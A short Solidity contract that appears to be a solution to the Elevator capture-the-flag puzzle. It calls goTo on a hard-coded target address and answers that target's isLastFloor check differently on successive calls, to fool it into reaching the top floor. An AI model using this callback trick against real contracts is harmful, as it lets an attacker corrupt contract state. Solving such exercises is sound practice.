// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

interface IElevator {
  function goTo(uint) external;
}

contract Elevator {
    IElevator target = IElevator(0x4AF0DE58faAdDac3a782142e365A1746283f220F);
    uint256 floor;
    bool top = true;

    function isLastFloor(uint _floor) external returns (bool) {
        floor = _floor;
        top = !top;
        return top;
    }

    function callGoto() public {
        target.goTo(5);
    }
}